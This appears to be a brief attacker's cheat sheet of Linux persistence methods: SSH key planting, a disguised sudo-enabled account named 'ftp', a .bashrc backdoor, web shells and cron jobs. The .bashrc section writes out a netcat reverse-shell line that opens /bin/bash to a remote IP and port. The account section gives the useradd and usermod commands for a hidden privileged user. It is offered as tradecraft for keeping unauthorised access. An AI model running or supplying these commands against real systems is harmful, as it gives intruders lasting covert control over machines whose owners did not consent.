- Account Manipulation
        - Persistence via SSH Keys
- Creating a privileged local account
    - Unix shell configuration modification
    - Backdooring the .bashrc file
- Web Shell/Backdoor
- Cron jobs

Persistence via SSH
```
ssh-keygen
/root/.ssh/authorized_keys
```

Creating a Privilege Account
```
useradd -m -s /bin/bash ftp
usermod -aG sudo ftp
```

Unix Shell Modification
```
nano ~/.bashrc
nc -e /bin/bash <ip> <port> @>/dev/null &
```

PHP WebShells
```
look for php scripts
```

Crontabs
```
crontab -e
```